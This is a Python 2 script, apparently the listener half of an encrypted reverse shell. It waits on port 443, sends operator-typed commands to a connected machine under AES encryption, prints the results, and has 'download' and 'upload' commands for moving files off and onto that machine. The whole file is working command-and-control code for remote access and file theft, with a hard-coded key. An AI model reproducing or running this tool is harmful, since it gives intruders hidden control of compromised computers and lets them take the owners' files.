#!/usr/bin/env python

from Crypto.Cipher import AES
import socket
import base64
import os
import time

# the block size for the cipher object; must be 16, 24, or 32 for AES
BLOCK_SIZE = 32

# the character used for padding--with a block cipher such as AES, the value
# you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
# used to ensure that your value is always a multiple of BLOCK_SIZE
PADDING = '{'

# one-liner to sufficiently pad the text to be encrypted
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

# one-liners to encrypt/encode and decrypt/decode a string
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

# generate a random secret key
secret = "_)a342sdf345fg45g45he6u56h56h5eh"

# create a cipher object using the random secret
cipher = AES.new(secret,AES.MODE_CFB)

c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.bind(('0.0.0.0', 443))
c.listen(1)
s,a = c.accept()

downloading = False

while True:
	# receive encrypted data
	data = s.recv(1024)
	
	# decrypt data
	decrypted = DecodeAES(cipher, data)

	# check for end of command
	if decrypted.endswith("EOFEOFEOFEOFEOFX") == True:

		# print command
		print decrypted[:-16]
	
		if decrypted.startswith("Exit") == True:
			print 'Client exit.'

		# get next command
		nextcmd = raw_input("[shell]: ")
		
		# encrypt that $#!^
		encrypted = EncodeAES(cipher, nextcmd)
		
		# send that $hit
		s.send(encrypted)

		# download file (normal mode)
		if nextcmd.startswith("download") == True:

			# file name
			downFile = nextcmd[9:]

			# open file
			f = open(downFile, 'wb')
			print 'Downloading: ' + downFile
			
			# downloading
			while True:
				l = s.recv(1024)
				while (l):
					if l.endswith("EOFEOFEOFEOFEOFX"):
						u = l[:-16]
						f.write(u)
						break
					else:
						f.write(l)
						l = s.recv(1024)
				break
			f.close()
		
		if nextcmd.startswith("upload") == True:

			# file name
			upFile = nextcmd[7:]

			# open file
			g = open(upFile, 'rb')
			print 'Uploading: ' + upFile

			# uploading
			while 1:
				fileData = g.read()
				if not fileData: break
				# begin sending file
				s.sendall(fileData)
			g.close()
			time.sleep(0.8)

			# let client know we're done..
			s.sendall('EOFEOFEOFEOFEOFX')
			time.sleep(0.8)
		
	# else, just print
	else:

		print decrypted

